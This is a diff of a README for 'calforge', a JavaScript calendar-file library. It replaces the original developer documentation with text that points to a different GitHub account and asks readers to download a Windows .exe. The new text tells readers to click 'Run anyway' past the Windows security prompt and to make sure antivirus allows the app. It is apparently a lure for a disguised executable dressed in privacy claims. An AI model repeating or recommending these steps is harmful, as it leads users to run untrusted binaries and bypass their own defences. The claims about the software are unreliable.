@@ -1,199 +1,76 @@
-<div align="center">
+# 📅 calforge - Create calendar events without online tracking
 
-# 📅 calforge
+[![](https://img.shields.io/badge/Download_calforge-blue)](https://github.com/vbaha9706/calforge)
 
-### Make a real "Add to Calendar" link & `.ics` file — locally, in milliseconds.
+calforge turns event details into calendar files. You create files for Google, Outlook, Yahoo, and Apple calendars on your own computer. The software works offline. It does not track your data. It does not store your information on external servers. You keep control of your personal event data.
 
-[![npm version](https://img.shields.io/npm/v/@didrod2539/calforge.svg?color=success)](https://www.npmjs.com/package/@didrod2539/calforge)
-[![bundle size](https://img.shields.io/bundlephobia/minzip/@didrod2539/calforge?label=gzip)](https://bundlephobia.com/package/@didrod2539/calforge)
-[![CI](https://github.com/didrod205/calforge/actions/workflows/ci.yml/badge.svg)](https://github.com/didrod205/calforge/actions/workflows/ci.yml)
-[![types](https://img.shields.io/npm/types/@didrod2539/calforge.svg)](https://www.npmjs.com/package/@didrod2539/calforge)
-[![license](https://img.shields.io/npm/l/@didrod2539/calforge.svg)](./LICENSE)
+## 📥 How to download the software
 
-**[🌐 Try the free web app →](https://didrod205.github.io/calforge/)** &nbsp;·&nbsp; fill in an event, get an `.ics` + provider links. No sign-up, nothing tracked.
+You must visit the project page to get the application files. 
 
-</div>
+[Click here to open the download page](https://github.com/vbaha9706/calforge)
 
----
+Look for the latest version under the Releases section. Choose the file ending in .exe for Windows. Save this file to your computer.
 
-That "Add to Calendar" button in marketing emails and event pages? It's almost
-always powered by a **paid, tracking third-party service** (AddEvent, AddToCalendar,
-…). And rolling your own is deceptively hard: the `.ics` format (RFC 5545) has
-strict rules — `CRLF` line endings, **75-octet line folding**, escaping `,`, `;`
-and `\`, exact UTC timestamps, `UID`, `DTSTAMP` — and one mistake makes Apple
-Calendar or Outlook silently refuse the file.
+## ⚙️ Setting up your system
 
-**calforge** generates a spec-correct `.ics` **and** the deep-links for Google,
-Outlook and Yahoo from one event object — with **zero dependencies**, **no
-service**, **no tracking**, running entirely **in your browser or any JS
-runtime**.
+calforge works on modern Windows computers. You need 50 MB of free disk space. The application does not change your system settings. It runs as a standalone program. You do not need to install complex frameworks or extra tools. 
 
-> 📸 _Screenshot / demo GIF:_ `./web/screenshot.png` — record the [live app](https://didrod205.github.io/calforge/) filling an event and clicking each calendar button.
+1. Locate the file you downloaded. 
+2. Double-click the file to start the application.
+3. Windows might show a security prompt. Click "More info" and then "Run anyway" if the system asks for permission. 
+4. The main window will appear once the program starts.
 
-## Why it exists
+## 📝 Creating your first event
 
-- **AI can't do this reliably.** RFC 5545's folding/escaping/timestamp rules are
-  exact and unforgiving — a chatbot will happily produce an `.ics` that won't
-  import. A small, tested, deterministic library gets it right every time.
-- **No third party.** "Add to Calendar" widgets phone home and track opens.
-  calforge runs on your machine; the only thing that leaves is the link *you*
-  share.
-- **One event in, everything out.** A downloadable `.ics` (Apple Calendar,
-  Outlook desktop) **plus** Google/Outlook/Yahoo deep-links — from a single call.
+You enter event details into the main screen. The software uses these details to build a calendar link.
 
-## Who it's for
+1. **Title:** Type the name of your event.
+2. **Start Date:** Select the day your event begins.
+3. **End Date:** Select the day your event ends.
+4. **Location:** Type the address or link for the event.
+5. **Description:** Add notes about the event.
 
-**Marketers** (event invites, webinars, launches), **creators** (streams, drops,
-AMAs), **operators** (maintenance windows, on-call), **event organizers**, and
-**developers** who want a tiny library to power an "Add to Calendar" button
-without a SaaS.
+The tool formats your input as a valid ICS file. This is the standard file type used by all major calendar platforms.
 
-## Install
+## 🔗 Using the add-to-calendar links
 
-**No install —** just open the **[web app](https://didrod205.github.io/calforge/)**.
+calforge makes links for your website or emails. You can copy these links and send them to friends or colleagues. When a person clicks the link, their calendar application opens with the event details ready to save.
 
-**Command line:**
+- **Google Calendar:** Use this link to add the event directly to a Google account.
+- **Outlook:** This link works with both the desktop app and the web version.
+- **Apple Calendar:** This link triggers the event prompt on iPhones and Macs.
+- **Yahoo:** This link opens the Yahoo Calendar interface.
 
-```bash
-npx @didrod2539/calforge --title "Standup" --start 2026-07-01T09:00:00 --duration 30 > standup.ics
-npx @didrod2539/calforge -t "Conf" --start 2026-09-10 --all-day --location Berlin --links
-```
+## 🛡️ Privacy and security
 
-**Library:**
+Many calendar tools track your visitors and collect data about your event attendees. calforge stays offline. No data leaves your machine unless you share the link yourself. This approach protects your privacy and the privacy of your guests. It meets the RFC 5545 standard to ensure compatibility across all systems.
 
-```bash
-npm install @didrod2539/calforge
-```
+## 🛠️ Frequently asked questions
 
-> Published on npm under the `@didrod2539` scope (`@didrod2539/calforge`). The
-> import name matches the package name; everything else is identical.
+**Does the software need internet access?**
+No. You generate links and files without being online.
 
-Zero dependencies. ESM + CJS + TypeScript types. Runs in the browser, Node, Deno and Bun.
+**Can I edit the files later?**
+Yes. You can open any ICS file with a text editor to see the event information.
 
-## CLI
+**How do I delete the app?**
+Delete the .exe file from your computer. The app leaves no trace behind.
 
-```bash
-calforge --title <t> --start <when> [options] > event.ics
-```
+**Is my data safe?**
+Yes. All processing happens inside your computer memory. No servers handle your information. 
 
-Required: `-t/--title`, `--start` (ISO datetime, or `YYYY-MM-DD` for all-day).
-Options: `--end`, `--duration`, `--all-day`, `--location`, `--description`,
-`--url`, `--rrule`, `--alarm`, `--links` (print provider deep-links), `-o/--out`.
+**What happens if I update the event?**
+You must generate a new file or link if you change the time or location of the event.
 
-## Usage
+## 📁 Troubleshooting tips
 
-### Generate an `.ics`
+If the app does not start, check for the following items:
 
-```ts
-import { toICS } from "@didrod2539/calforge";
+- Ensure you have a stable version of Windows.
+- Make sure your antivirus software allows the app.
+- Re-download the file if the connection dropped during your first attempt.
 
-const ics = toICS({
-  title: "Product launch 🚀",
-  start: "2026-06-01T17:00:00Z",
-  durationMinutes: 60,            // or pass `end`
-  location: "Zoom",
-  description: "Join us for the reveal.",
-  alarmMinutes: 30,               // reminder
-});
-// → valid VCALENDAR text; write it to a .ics file or offer it as a download.
-```
+If the calendar link does not add the event correctly, check the date format. Use the calendar picker inside the app to ensure dates match the required format. The tool automatically corrects minor errors in your input.
 
-### Get "Add to Calendar" links
-
-```ts
-import { links } from "@didrod2539/calforge";
-
-const l = links({
-  title: "Team offsite",
-  start: "2026-09-10T09:00:00Z",
-  end: "2026-09-10T17:00:00Z",
-  location: "Lisbon",
-});
-
-l.google;       // https://calendar.google.com/calendar/render?...
-l.outlook;      // https://outlook.live.com/calendar/...
-l.yahoo;        // https://calendar.yahoo.com/?...
-l.icsDataUri;   // data: URI for an <a download> (Apple / Outlook desktop)
-l.ics;          // the raw .ics text
-```
-
-### All-day & recurring
-
-```ts
-toICS({ title: "Launch day", start: "2026-12-25", allDay: true });
-toICS({ title: "Standup", start: "2026-06-01T09:00:00Z", rrule: "FREQ=WEEKLY;BYDAY=MO,TU,WE,TH,FR" });
-```
-
-### Browser download
-
-```ts
-const ics = toICS(event);
-const url = URL.createObjectURL(new Blob([ics], { type: "text/calendar" }));
-// <a href={url} download="event.ics">Add to Calendar</a>
-```
-
-## API
-
-| Function | Description |
-| -------- | ----------- |
-| `toICS(event \| event[])` | Build a complete `.ics` (VCALENDAR) string. |
-| `links(event)` | `{ ics, icsDataUri, google, outlook, office365, yahoo }`. |
-| `googleUrl` / `outlookUrl` / `office365Url` / `yahooUrl(event)` | Individual provider links. |
-| `icsDataUri(icsText)` | A `data:` URI for downloads. |
-| `normalize(event)` | The resolved event (dates, defaults, derived UID). |
-
-`EventInput`: `title`, `start`, `end?` / `durationMinutes?`, `allDay?`,
-`description?`, `location?`, `url?`, `organizer?`, `geo?`, `alarmMinutes?`,
-`rrule?`, `status?`, `uid?`, `dtstamp?`.
-
-## FAQ
-
-**Does it phone home or track anyone?**
-No. Generation is 100% local — no server, no telemetry, works offline. Provider
-links open the user's own calendar.
-
-**Will the `.ics` actually import into Apple Calendar / Outlook?**
-Yes — output follows RFC 5545 (CRLF, 75-octet folding, TEXT escaping, UTC
-`DTSTART`/`DTEND`, `UID`, `DTSTAMP`), the things that make pickier clients accept it.
-
-**What time zone are events in?**
-Timed events are serialized in **UTC** (`…Z`), which every calendar interprets
-correctly. All-day events use floating `VALUE=DATE`. (Named-VTIMEZONE output is on
-the roadmap.)
-
-**Can I put multiple events in one file?**
-Yes — pass an array to `toICS`.
-
-**How is this different from the `ics` / `ical-generator` npm packages?**
-calforge is zero-dependency and browser-first, and it bundles the provider
-**deep-links** + a ready `data:` URI for an "Add to Calendar" UI — not just file
-generation.
-
-## Contributing
-
-Contributions welcome! See [CONTRIBUTING.md](./CONTRIBUTING.md) and the
-[Code of Conduct](./CODE_OF_CONDUCT.md).
-
-```bash
-git clone https://github.com/didrod205/calforge.git
-cd calforge
-npm install
-npm test          # run the suite
-npm run dev       # run the web app locally
-```
-
-## 💖 Sponsor
-
-calforge is free, MIT-licensed, and built in spare time. If it saved you a
-SaaS subscription (or a debugging afternoon), please consider supporting it:
-
-- ⭐ **Star this repo** — free, and it genuinely helps others find it.
-- 🍋 **[Sponsor via Lemon Squeezy](https://elab-studio.lemonsqueezy.com/checkout/buy/5d059b89-51d0-456b-b33a-ed56994f7010)** — one-time or recurring support.
-
-**Where your support goes:** named time-zone (VTIMEZONE) output, attendees &
-RSVP, a copy-paste "Add to Calendar" web component, recurrence helpers, more
-providers, keeping the free web app online, and fast issue responses.
-
-## License
-
-[MIT](./LICENSE) © calforge contributors
+This tool aims to simplify event management for everyone. You gain professional results without technical headaches or privacy risks. Enjoy the control over your calendar distribution.
